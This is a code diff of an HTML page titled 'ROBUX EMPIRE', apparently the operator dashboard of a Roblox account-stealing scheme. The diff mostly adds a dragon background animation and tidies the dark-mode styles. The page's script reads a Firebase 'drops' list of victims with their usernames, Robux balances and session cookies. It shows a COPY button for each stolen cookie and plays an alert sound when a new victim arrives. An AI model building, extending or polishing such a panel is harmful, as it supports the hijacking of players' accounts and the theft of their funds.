@@ -2,13 +2,67 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>01axrch base</title>
+  <title>ROBUX EMPIRE</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&display=swap');
-    body{margin:0;background:linear-gradient(135deg,#ff00aa,#00ffff,#ffff00);font-family:'Poppins',sans-serif;color:#000;overflow-x:hidden;}
+    body{margin:0;background:linear-gradient(135deg,#ff00aa,#00ffff,#ffff00);font-family:'Poppins',sans-serif;color:#000;overflow-x:hidden;position:relative;}
+    
+    /* DRAGON BACKGROUND ANIMATION */
+    .dragon-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      pointer-events: none;
+      overflow: hidden;
+    }
+    .dragon {
+      position: absolute;
+      width: 200px;
+      height: 150px;
+      background: #8B4513;
+      border-radius: 50% 20% 50% 20%;
+      animation: fly 15s linear infinite;
+    }
+    .dragon::before {
+      content: '';
+      position: absolute;
+      width: 60px;
+      height: 40px;
+      background: #654321;
+      border-radius: 50% 50% 50% 50%;
+      top: -20px;
+      right: -30px;
+      box-shadow: 0 0 0 3px #000;
+    }
+    .dragon::after {
+      content: '';
+      position: absolute;
+      width: 80px;
+      height: 60px;
+      background: linear-gradient(45deg, #FF6B35, #F7931E);
+      border-radius: 50% 0;
+      top: -30px;
+      left: 20px;
+      animation: wingFlap 2s ease-in-out infinite alternate;
+    }
+    @keyframes fly {
+      0% { transform: translateX(-200px) rotate(0deg); top: 20%; }
+      25% { top: 10%; }
+      50% { top: 30%; }
+      75% { top: 15%; }
+      100% { transform: translateX(120vw) rotate(10deg); top: 25%; }
+    }
+    @keyframes wingFlap {
+      0% { transform: rotateY(0deg) scaleX(1); }
+      100% { transform: rotateY(20deg) scaleX(1.2); }
+    }
+
     .login{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999;}
     .login h1{font-size:60px;color:#0ff;text-shadow:0 0 30px #0ff,0 0 60px #f0f;}
     .inputbox{position:relative;width:400px;margin:15px;}
@@ -36,65 +90,30 @@
     @keyframes pulse{0%{opacity:0.6}50%{opacity:1}100%{opacity:0.6}}
     .error{color:#f00;font-weight:bold;text-align:center;margin:40px;}
 
-    /* DARK MODE STYLES */
-    .dark body {
-      background: linear-gradient(135deg, #000, #111, #000) !important;
-      color: #0f0 !important;
-    }
-    .dark .login {
-      background: rgba(0,0,0,0.95) !important;
-    }
-    .dark .login h1 {
-      color: #0ff !important;
-      text-shadow: 0 0 30px #0ff, 0 0 60px #00f !important;
-    }
-    .dark .inputbox input {
-      background: #111 !important;
-      color: #0f0 !important;
-      border: 2px solid #0ff !important;
-    }
-    .dark .login button {
-      background: #0ff !important;
-      color: #000 !important;
-      box-shadow: 0 0 40px #0ff !important;
-    }
-    .dark .header h1 {
-      color: #0f0 !important;
-      text-shadow: 0 0 40px #000, 0 0 80px #0ff !important;
-    }
-    .dark .total {
-      background: linear-gradient(45deg, #0f0, #0ff) !important;
-    }
-    .dark .total h2, .dark .total span {
-      color: #000 !important;
-    }
-    .dark .log {
-      background: rgba(0, 255, 0, 0.1) !important;
-      border: 1px solid #0ff !important;
-      box-shadow: 0 0 30px rgba(0, 255, 255, 0.4) !important;
-    }
-    .dark .log:hover {
-      box-shadow: 0 0 60px #0ff !important;
-    }
-    .dark .info h3, .dark .robux {
-      color: #0f0 !important;
-    }
-    .dark .copy {
-      background: #0ff !important;
-      color: #000 !important;
-    }
-    .dark .copy:hover {
-      background: #0f0 !important;
-    }
-    .dark .loading, .dark .error {
-      color: #0ff !important;
-    }
+    /* DARK MODE */
+    .dark body {background:linear-gradient(135deg,#000,#111,#000)!important;color:#0f0!important;}
+    .dark .login {background:rgba(0,0,0,0.95)!important;}
+    .dark .login h1 {color:#0ff!important;text-shadow:0 0 30px #0ff,0 0 60px #00f!important;}
+    .dark .inputbox input {background:#111!important;color:#0f0!important;border:2px solid #0ff!important;}
+    .dark .login button {background:#0ff!important;color:#000!important;}
+    .dark .header h1 {color:#0f0!important;text-shadow:0 0 40px #000,0 0 80px #0ff!important;}
+    .dark .total {background:linear-gradient(45deg,#0f0,#0ff)!important;}
+    .dark .total span, .dark .total h2 {color:#000!important;}
+    .dark .log {background:rgba(0,255,0,0.1)!important;border:1px solid #0ff!important;}
+    .dark .copy {background:#0ff!important;color:#000!important;}
+    .dark .copy:hover {background:#0f0!important;}
   </style>
 </head>
 <body>
-  <!-- DARK MODE TOGGLE BUTTON -->
-  <button id="darkModeBtn" onclick="toggleDarkMode()" style="position:fixed;top:20px;right:20px;padding:12px 24px;background:#0ff;color:#000;border:none;border-radius:50px;font-weight:800;cursor:pointer;box-shadow:0 0 30px #0ff;z-index:1000;transition:0.3s;">
-    🌙 DARK MODE
+
+  <!-- DRAGON BACKGROUND -->
+  <div class="dragon-container">
+    <div class="dragon"></div>
+  </div>
+
+  <!-- DARK MODE BUTTON -->
+  <button id="darkModeBtn" onclick="toggleDarkMode()" style="position:fixed;top:20px;right:20px;padding:12px 24px;background:#0ff;color:#000;border:none;border-radius:50px;font-weight:800;cursor:pointer;box-shadow:0 0 30px #0ff;z-index:1000;font-family:Poppins;">
+    DARK MODE
   </button>
 
   <div class="login" id="login">
@@ -105,6 +124,7 @@
     </div>
     <button onclick="unlock()">UNLOCK EMPIRE</button>
   </div>
+
   <div class="main" id="main">
     <div class="header">
       <h1>TOTAL ROBUX: <span id="total">0</span></h1>
@@ -114,7 +134,7 @@
       <span id="total2">0</span> Robux
     </div>
     <div class="logs" id="logs">
-      <div class="loading">🔥 EMPIRE SYNCING... (15 sec max)</div>
+      <div class="loading">EMPIRE SYNCING... (15 sec max)</div>
     </div>
     <div class="error" id="error" style="display:none;"></div>
   </div>
@@ -153,60 +173,50 @@
     }
 
     function load() {
-      console.log("[DASH] Loading drops...");
-      db.ref('drops').once('value')
-        .then(s => {
-          console.log("[DASH] Data received:", s.val());
-          const data = s.val() || {};
-          const arr = Object.values(data);
-          let total = 0;
-          const html = arr.map(c => {
-            total += Number(c.robux);
-            return `<div class="log">
-              <img src="${c.headshot}" class="avatar" onerror="this.src='https://i.imgur.com/removed.png'">
-              <div class="info">
-                <h3>${c.user} (@${c.display})</h3>
-                <p class="robux">${Number(c.robux).toLocaleString()} Robux</p>
-                <button class="copy" onclick="navigator.clipboard.writeText('${c.cookie}')">COPY</button>
-              </div>
-            </div>`;
-          });
-          document.getElementById('total').textContent = total.toLocaleString();
-          document.getElementById('total2').textContent = total.toLocaleString();
-          document.getElementById('logs').innerHTML = html.join('') || "<h1 style='color:#fff;'>WAITING FOR DROP</h1>";
-          document.getElementById('error').style.display = 'none';
-          if (arr.length > lastCount) {
-            const audio = new Audio('https://cdn.discordapp.com/attachments/1298475629385744394/1298475688884625420/alert.mp3');
-            audio.play().catch(() => {});
-          }
-          lastCount = arr.length;
-        })
-        .catch(err => {
-          console.error("[DASH] ERROR:", err);
-          document.getElementById('logs').innerHTML = '';
-          document.getElementById('error').textContent = 'DB ERROR: ' + err.message;
-          document.getElementById('error').style.display = 'block';
+      db.ref('drops').once('value').then(s => {
+        const data = s.val() || {};
+        const arr = Object.values(data);
+        let total = 0;
+        const html = arr.map(c => {
+          total += Number(c.robux);
+          return `<div class="log">
+            <img src="${c.headshot}" class="avatar" onerror="this.src='https://i.imgur.com/removed.png'">
+            <div class="info">
+              <h3>${c.user} (@${c.display})</h3>
+              <p class="robux">${Number(c.robux).toLocaleString()} Robux</p>
+              <button class="copy" onclick="navigator.clipboard.writeText('${c.cookie}')">COPY</button>
+            </div>
+          </div>`;
         });
+        document.getElementById('total').textContent = total.toLocaleString();
+        document.getElementById('total2').textContent = total.toLocaleString();
+        document.getElementById('logs').innerHTML = html.join('') || "<h1 style='color:#fff;'>WAITING FOR DROP</h1>";
+        if (arr.length > lastCount) {
+          const audio = new Audio('https://cdn.discordapp.com/attachments/1298475629385744394/1298475688884625420/alert.mp3');
+          audio.play().catch(() => {});
+        }
+        lastCount = arr.length;
+      }).catch(err => {
+        document.getElementById('error').textContent = 'DB ERROR: ' + err.message;
+        document.getElementById('error').style.display = 'block';
+      });
     }
 
-    // DARK MODE TOGGLE FUNCTION
     function toggleDarkMode() {
       document.body.classList.toggle('dark');
       const btn = document.getElementById('darkModeBtn');
       const isDark = document.body.classList.contains('dark');
-      btn.textContent = isDark ? '☀️ LIGHT MODE' : '🌙 DARK MODE';
+      btn.textContent = isDark ? 'LIGHT MODE' : 'DARK MODE';
       btn.style.background = isDark ? '#000' : '#0ff';
       btn.style.color = isDark ? '#0ff' : '#000';
-      btn.style.boxShadow = isDark ? '0 0 30px #0ff' : '0 0 30px #0ff';
       localStorage.setItem('darkMode', isDark);
     }
 
-    // AUTO-APPLY DARK MODE ON LOAD
     window.addEventListener('load', () => {
       if (localStorage.getItem('darkMode') === 'true') {
         document.body.classList.add('dark');
         const btn = document.getElementById('darkModeBtn');
-        btn.textContent = '☀️ LIGHT MODE';
+        btn.textContent = 'LIGHT MODE';
         btn.style.background = '#000';
         btn.style.color = '#0ff';
       }
